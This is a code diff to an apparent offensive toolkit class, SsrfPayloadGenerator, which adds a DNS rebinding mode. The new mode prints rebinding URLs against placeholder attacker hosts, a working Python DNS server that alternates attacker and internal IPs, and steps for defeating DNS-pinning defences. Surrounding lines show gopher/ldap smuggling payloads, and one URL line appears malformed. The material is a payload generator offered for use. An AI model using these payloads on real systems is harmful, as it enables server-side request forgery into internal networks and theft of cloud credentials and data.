@@ -287,7 +287,7 @@ class SsrfPayloadGenerator:
         "paths for AWS/GCP/Azure/DigitalOcean. protocol_smuggling generates gopher/dict/tftp/ldap payloads."
     )
 
-    VALID_OPERATIONS = ["ip_bypass", "cloud_metadata", "protocol_smuggling"]
+    VALID_OPERATIONS = ["ip_bypass", "cloud_metadata", "protocol_smuggling", "dns_rebinding"]
 
     def __init__(self):
         pass
@@ -321,6 +321,8 @@ class SsrfPayloadGenerator:
             return self._generate_cloud_metadata()
         elif operation == "protocol_smuggling":
             return self._generate_protocol_smuggling(target_ip, target_port)
+        elif operation == "dns_rebinding":
+            return self._generate_dns_rebinding(target_ip, target_port)
 
         return "[SsrfPayloadGenerator] Error: Unexpected state."
 
@@ -510,5 +512,96 @@ class SsrfPayloadGenerator:
         result.append(f"ldap://{target_ip}:389/dc=example,dc=com?cn,sn?sub?(cn=*)")
         result.append("[*] ldap:// can interact with LDAP services")
         result.append("[*] Can exfiltrate data from directory services")
+
+        return "\n".join(result)
+
+    def _generate_dns_rebinding(self, target_ip: str, target_port: int) -> str:
+        """Generate DNS rebinding payloads for SSRF bypass."""
+        result = [f"[SsrfPayloadGenerator] DNS Rebinding Payloads for {target_ip}"]
+        result.append("=" * 55)
+        result.append("")
+
+        result.append("=== How DNS Rebinding Works ===")
+        result.append("1. Victim app resolves attacker domain -> gets attacker IP (passes allowlist)")
+        result.append("2. Attacker DNS server changes record to target internal IP")
+        result.append("3. Victim app makes the actual request -> hits internal IP")
+        result.append("4. Bypasses IP-based allowlists since DNS check != connection IP")
+        result.append("")
+
+        result.append("=== Public DNS Rebinding Services ===")
+        result.append("")
+        result.append("--- rbndr.us (Nicholas Carlini) ---")
+        result.append(f"http://a]ATTACKER_IP[b]{target_ip}.rbndr.us")
+        result.append(f"http://7f000001.{target_ip.replace('.', '')}.rbndr.us")
+        result.append("[*] Alternates between the two IPs on each DNS query")
+        result.append("")
+
+        result.append("--- 1u.ms ---")
+        result.append(f"http://make-{target_ip.replace('.', '-')}-rr.1u.ms")
+        result.append("[*] Returns the specified IP as A record")
+        result.append("")
+
+        result.append("--- nip.io / sslip.io ---")
+        result.append(f"http://{target_ip}.nip.io")
+        result.append(f"http://{target_ip}.sslip.io")
+        result.append("[*] Always resolves to the embedded IP (useful for filter bypass)")
+        result.append("")
+
+        result.append("--- ceye.io (OOB DNS) ---")
+        result.append("http://RANDOM.YOUR_ID.ceye.io")
+        result.append("[*] Register at ceye.io for DNS/HTTP callback monitoring")
+        result.append("")
+
+        result.append("=== Self-hosted DNS Rebinding ===")
+        result.append("")
+        result.append("--- Python DNS rebinding server ---")
+        result.append("```python")
+        result.append("from dnslib import RR, QTYPE, A, DNSRecord")
+        result.append("from dnslib.server import DNSServer, BaseResolver")
+        result.append("import threading, time")
+        result.append("")
+        result.append("class RebindResolver(BaseResolver):")
+        result.append("    def __init__(self, attacker_ip, target_ip):")
+        result.append("        self.ips = [attacker_ip, target_ip]")
+        result.append("        self.counter = 0")
+        result.append("")
+        result.append("    def resolve(self, request, handler):")
+        result.append("        reply = request.reply()")
+        result.append("        ip = self.ips[self.counter % 2]")
+        result.append("        self.counter += 1")
+        result.append("        reply.add_answer(RR(request.q.qname, QTYPE.A, rdata=A(ip), ttl=0))")
+        result.append("        return reply")
+        result.append("")
+        result.append(f"resolver = RebindResolver('ATTACKER_IP', '{target_ip}')")
+        result.append("server = DNSServer(resolver, port=53, address='0.0.0.0')")
+        result.append("server.start()")
+        result.append("```")
+        result.append("")
+
+        result.append("=== Timing-based DNS Rebinding ===")
+        result.append("")
+        result.append("Key: Set TTL=0 on DNS responses to prevent caching.")
+        result.append("Steps:")
+        result.append("1. First DNS query: respond with your public IP (passes check)")
+        result.append("2. Wait for the app to make the actual HTTP request")
+        result.append(f"3. Second DNS query: respond with {target_ip}")
+        result.append("4. The HTTP request goes to the internal target")
+        result.append("")
+        result.append("=== Bypassing DNS Rebinding Protections ===")
+        result.append("")
+        result.append("If the target pins DNS results:")
+        result.append(f"1. Try TOCTOU: submit URL, quickly change DNS to {target_ip}")
+        result.append("2. Use CNAME chains: CNAME -> another domain you control")
+        result.append("3. Use IPv6 dual-stack: DNS returns A=public + AAAA=internal")
+        result.append("4. Use multiple A records: one public + one internal")
+        result.append("   (some resolvers randomly pick from multiple A records)")
+        result.append("")
+
+        result.append("=== Tips ===")
+        result.append("1. DNS rebinding bypasses allowlists that check resolved IP at request time")
+        result.append("2. Set TTL=0 in your DNS responses to prevent caching")
+        result.append("3. Some apps cache DNS results in-process (Java, Go) — harder to rebind")
+        result.append("4. Combine with race conditions for better success rate")
+        result.append(f"5. Target common internal services: {target_ip}:80, :8080, :3000, :5000")
 
         return "\n".join(result)
